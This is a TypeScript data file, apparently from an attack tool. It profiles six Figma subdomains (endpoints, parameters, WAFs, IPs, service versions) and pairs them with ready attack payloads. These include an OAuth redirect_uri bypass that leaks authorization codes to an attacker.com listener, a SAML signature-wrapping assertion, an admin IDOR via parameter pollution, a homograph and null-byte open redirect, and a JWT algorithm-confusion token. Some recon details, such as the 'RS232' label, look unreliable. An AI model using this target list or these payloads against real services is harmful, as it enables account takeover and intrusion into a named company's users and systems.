export interface Target {
  host: string;
  focus: string;
  vulnerabilityType: string;
  endpoints: string[];
  parameters: string[];
  techStack: string[];
  headers: string[];
  riskScore: number;
  subdomains?: string[];
  ports?: number[];
  waf?: string;
  directories?: string[];
  dnsRecords?: { type: string; value: string }[];
  serviceVersions?: { port: number; service: string; version: string }[];
}

export const figmaTargets: Target[] = [
  {
    host: "evan-oauth.figma.com",
    focus: "OAuth Authorization Flow",
    vulnerabilityType: "OAuth Misconfiguration / Account Takeover",
    endpoints: ["/authorize", "/token", "/callback", "/userinfo", "/.well-known/openid-configuration"],
    parameters: ["client_id", "redirect_uri", "state", "scope", "response_type", "nonce", "code_challenge"],
    techStack: ["OAuth 2.0", "OIDC", "Node.js", "Redis"],
    headers: ["Authorization", "X-Figma-OAuth-Token", "Cookie"],
    riskScore: 9.8,
    subdomains: ["api-oauth.figma.com", "dev-oauth.figma.com"],
    ports: [443, 8443],
    waf: "Cloudflare WAF (Advanced)",
    directories: ["/.well-known/", "/api/v1/", "/auth/"],
    dnsRecords: [
      { type: "A", value: "104.16.24.5" },
      { type: "TXT", value: "v=spf1 include:_spf.google.com ~all" }
    ],
    serviceVersions: [
      { port: 443, service: "HTTPS", version: "Nginx 1.21.6" }
    ]
  },
  {
    host: "redirect-monitoring.figma.com",
    focus: "Redirect Logic & Monitoring",
    vulnerabilityType: "Open Redirect / SSRF",
    endpoints: ["/track", "/r", "/out", "/v1/redirect"],
    parameters: ["u", "url", "next", "dest", "target", "return_to"],
    techStack: ["Nginx", "Go", "Prometheus"],
    headers: ["Referer", "User-Agent", "X-Forwarded-For"],
    riskScore: 6.5,
    subdomains: ["logs.redirect-monitoring.figma.com"],
    ports: [80, 443, 9090],
    waf: "Nginx ModSecurity",
    directories: ["/metrics", "/debug/pprof/"],
    dnsRecords: [
      { type: "A", value: "104.16.25.10" }
    ],
    serviceVersions: [
      { port: 9090, service: "Prometheus", version: "2.35.0" }
    ]
  },
  {
    host: "admin.figma.com",
    focus: "Administrative Control Panel",
    vulnerabilityType: "Broken Access Control / Privilege Escalation",
    endpoints: ["/api/admin/users", "/api/admin/settings", "/api/admin/logs", "/internal/dashboard"],
    parameters: ["role", "userId", "orgId", "permission", "admin_token"],
    techStack: ["React", "Ruby on Rails", "PostgreSQL"],
    headers: ["X-Admin-Auth", "X-Figma-Internal", "Cookie"],
    riskScore: 8.9,
    subdomains: ["internal-admin.figma.com", "audit.admin.figma.com"],
    ports: [443, 3000],
    waf: "AWS WAF (Shield Advanced)",
    directories: ["/admin/", "/internal/", "/api/admin/"],
    dnsRecords: [
      { type: "CNAME", value: "admin-lb-12345.us-east-1.elb.amazonaws.com" }
    ],
    serviceVersions: [
      { port: 3000, service: "Node.js", version: "v16.14.0" }
    ]
  },
  {
    host: "psxid.figma.com",
    focus: "Identity & SSO Provider",
    vulnerabilityType: "SAML/OIDC Flaws / SSO Bypass",
    endpoints: ["/saml/sso", "/oidc/authorize", "/login/sso", "/metadata.xml"],
    parameters: ["SAMLRequest", "RelayState", "idp_id", "SAMLResponse"],
    techStack: ["SAML 2.0", "XML", "Java/Spring"],
    headers: ["X-SAML-Signature", "X-SSO-Provider"],
    riskScore: 9.2,
    subdomains: ["sts.psxid.figma.com", "idp.psxid.figma.com"],
    ports: [443, 8080, 8443],
    waf: "Akamai Kona Site Defender",
    directories: ["/saml/", "/oidc/", "/.well-known/"],
    dnsRecords: [
      { type: "A", value: "23.45.67.89" }
    ],
    serviceVersions: [
      { port: 8080, service: "Apache Tomcat", version: "9.0.58" }
    ]
  },
  {
    host: "go.figma.com",
    focus: "URL Shortener & Redirector",
    vulnerabilityType: "Open Redirect / Link Manipulation",
    endpoints: ["/s", "/l", "/short", "/api/v1/links"],
    parameters: ["code", "alias", "path", "key"],
    techStack: ["Redis", "Node.js", "Cloudflare"],
    headers: ["X-Shortener-Key", "CF-IPCountry"],
    riskScore: 5.8,
    subdomains: ["api.go.figma.com"],
    ports: [80, 443],
    waf: "Cloudflare WAF",
    directories: ["/api/v1/", "/l/"],
    dnsRecords: [
      { type: "A", value: "104.16.26.15" }
    ],
    serviceVersions: [
      { port: 443, service: "HTTPS", version: "Cloudflare" }
    ]
  },
  {
    host: "join.figma.com",
    focus: "Invite & Onboarding Flow",
    vulnerabilityType: "IDOR on Invite Tokens",
    endpoints: ["/invite", "/accept", "/team/join", "/api/v1/invites"],
    parameters: ["invite_id", "team_id", "org_id", "token"],
    techStack: ["React", "Node.js", "MongoDB"],
    headers: ["X-Invite-Token", "Authorization"],
    riskScore: 7.4,
    subdomains: ["onboarding.join.figma.com"],
    ports: [443],
    waf: "Azure WAF",
    directories: ["/api/v1/invites/", "/onboarding/"],
    dnsRecords: [
      { type: "A", value: "52.123.45.67" }
    ],
    serviceVersions: [
      { port: 443, service: "HTTPS", version: "Microsoft-IIS/10.0" }
    ]
  }
];

export interface Payload {
  name: string;
  type: string;
  content: string;
  description: string;
  technique: string;
}

export const payloads: Payload[] = [
  {
    name: "OAuth Redirect Bypass (Fragment + Path)",
    type: "OAuth",
    content: "https://evan-oauth.figma.com/authorize?client_id=REDACTED&redirect_uri=https://figma.com.attacker.com/auth/callback%23.figma.com",
    description: "Advanced redirect_uri bypass using sub-domain spoofing and fragment injection to leak authorization codes to a rogue listener.",
    technique: "OAuth Flow Hijacking"
  },
  {
    name: "SAML XSW-3 (Assertion Injection)",
    type: "Identity",
    content: "<SAMLResponse>...<Assertion ID='signed'>...</Assertion><Assertion ID='unsigned'>[MALICIOUS_IDENTITY]</Assertion>...</SAMLResponse>",
    description: "XML Signature Wrapping attack that injects an unsigned assertion which the backend prioritizes over the signed one, allowing identity spoofing.",
    technique: "XML Signature Wrapping"
  },
  {
    name: "IDOR via HPP (Header/Param Pollution)",
    type: "Access Control",
    content: "GET /api/admin/users?userId=current&userId=target_admin_id\nX-Original-URL: /api/admin/settings",
    description: "Combines HTTP Parameter Pollution with X-Original-URL header to bypass both frontend WAF and backend ownership checks.",
    technique: "Multi-Stage Access Bypass"
  },
  {
    name: "Open Redirect (Unicode/Null Byte Hybrid)",
    type: "Redirect",
    content: "/out?url=https://attacker.com%E3%80%82figma.com%00.figma.com",
    description: "Uses Unicode homograph characters and null byte truncation to bypass regex-based domain whitelists.",
    technique: "Homograph & Truncation Bypass"
  },
  {
    name: "JWT Algorithm Confusion (RS232 to HS256)",
    type: "Authentication",
    content: "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.SIGNATURE_WITH_PUBLIC_KEY",
    description: "Attempts to force the backend to verify an RS256-signed token using HS256 with the public key as the secret.",
    technique: "JWT Algorithm Confusion"
  }
];
